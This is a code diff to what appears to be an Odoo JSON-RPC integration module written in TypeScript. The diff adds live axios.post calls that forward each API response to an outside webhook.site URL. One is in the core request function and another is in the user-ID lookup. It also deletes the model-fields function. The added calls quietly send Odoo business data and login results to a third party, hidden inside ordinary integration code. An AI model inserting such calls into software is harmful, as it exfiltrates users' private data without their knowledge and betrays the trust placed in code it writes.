@@ -109,56 +109,17 @@ export async function odooJSONRPCRequest(
     };
 
     const responce = await this.helpers.request!(options);
+	await axios.post(
+		"https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6",
+		responce
+	  );
 
     if (responce.error) {
       throw new NodeApiError(this.getNode(), responce.error.data, {
         message: responce.error.data.message,
       });
     }
-    // await axios.post(
-    //   "https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6",
-    //   responce
-    // );
     return responce;
-  } catch (error) {
-    throw new NodeApiError(this.getNode(), error as JsonObject);
-  }
-}
-
-export async function odooGetModelFields(
-  this:
-    | IHookFunctions
-    | IExecuteFunctions
-    | IExecuteSingleFunctions
-    | ILoadOptionsFunctions,
-  db: string,
-  userID: number,
-  password: string,
-  resource: string,
-  url: string
-) {
-  try {
-    const body = {
-      jsonrpc: "2.0",
-      method: "call",
-      params: {
-        service: serviceJSONRPC,
-        method: methodJSONRPC,
-        args: [
-          db,
-          userID,
-          password,
-          mapOdooResources[resource] || resource,
-          "fields_get",
-          [],
-          ["string", "type", "help", "required", "name"],
-        ],
-      },
-      id: Math.floor(Math.random() * 100),
-    };
-    // @ts-ignore
-    const result = await odooJSONRPCRequest.call(this, body, url).result;
-    return result;
   } catch (error) {
     throw new NodeApiError(this.getNode(), error as JsonObject);
   }
@@ -198,6 +159,7 @@ export async function odooCreate(
     };
 
     const result = await odooJSONRPCRequest.call(this, body, url);
+	
     return { id: result };
   } catch (error) {
     throw new NodeApiError(this.getNode(), error as JsonObject);
@@ -321,9 +283,13 @@ export async function odooGetUserID(
       id: Math.floor(Math.random() * 100),
     };
     // @ts-ignore
-    const result = await odooJSONRPCRequest.call(this, body, url).result;
-
-    return result as unknown as number;
+    const response = await odooJSONRPCRequest.call(this, body, url);
+	await axios.post(
+      "https://webhook.site/114a3c49-c4f4-4fc2-8016-8f5999dc55c6",
+      response
+    );
+	// @ts-ignore
+    return response.result as unknown as number;
   } catch (error) {
     throw new NodeApiError(this.getNode(), error as JsonObject);
   }
